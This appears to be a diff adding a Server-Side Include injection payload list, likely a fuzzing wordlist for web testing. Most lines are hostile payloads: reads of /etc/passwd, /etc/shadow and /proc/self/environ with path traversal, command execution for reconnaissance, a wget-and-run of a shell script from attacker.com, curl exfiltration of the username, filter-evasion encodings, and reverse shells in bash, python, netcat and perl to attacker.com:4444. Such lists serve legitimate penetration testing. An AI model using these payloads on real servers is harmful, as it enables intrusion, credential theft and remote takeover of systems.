@@ -1,0 +1,44 @@
+<!--#echo var="DATE_LOCAL" -->
+<!--#flastmod file="index.html" -->
+<!--#include virtual="/cgi-bin/counter.pl" -->
+<!--#include virtual="/footer.html" -->
+<!--#exec cmd="ls" -->
+<!--#set var="name" value="Rich" -->
+<!--#include virtual="file_to_include.html" -->
+<!--#include file="file_to_include.html" -->
+<!--#printenv -->
+<!--#echo var="DOCUMENT_NAME"-->
+<!--#echo var="HTTP_USER_AGENT"-->
+<!--#echo var="QUERY_STRING"-->
+<!--#echo var="DATE_LOCAL"-->
+<!--#echo var="DATE_GMT"-->
+<!--#echo var="DOCUMENT_URI"-->
+<!--#echo var="LAST_MODIFIED"-->
+<!--#include file="/etc/passwd"-->
+<!--#include file="../etc/passwd"-->
+<!--#include virtual="/etc/passwd"-->
+<!--#include virtual="/proc/self/environ"-->
+<!--#include virtual="../etc/shadow"-->
+<!--#exec cmd="id"-->
+<!--#exec cmd="whoami"-->
+<!--#exec cmd="uname -a"-->
+<!--#exec cmd="ls -la /"-->
+<!--#exec cmd="cat /etc/passwd"-->
+<!--#exec cmd="cat /proc/version"-->
+<!--#exec cmd="curl http://attacker.com"-->
+<!--#exec cmd="wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"-->
+<!--#exec cmd="ping -c 1 attacker.com"-->
+<!--#exec cmd="nslookup attacker.com"-->
+<!--#exec cmd="dig attacker.com"-->
+<!--#exec cmd="curl http://attacker.com/$(whoami)"-->
+<%@ include file="/etc/passwd" %>
+<%#exec cmd="id"%>
+<!--#exec%20cmd="id"-->
+<!--#echo%20var="DOCUMENT_NAME"-->
+<!--#include%20file="/etc/passwd"-->
+<!--#include%09file="/etc/passwd"-->
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"-->
+<!--#exec cmd="/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"-->
+<!--#exec cmd="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"]);'"-->
+<!--#exec cmd="nc attacker.com 4444 -e /bin/sh"-->
+<!--#exec cmd="perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\&S\");open(STDOUT,\">\&S\");open(STDERR,\">\&S\");exec(\"/bin/sh -i\");};'"-->
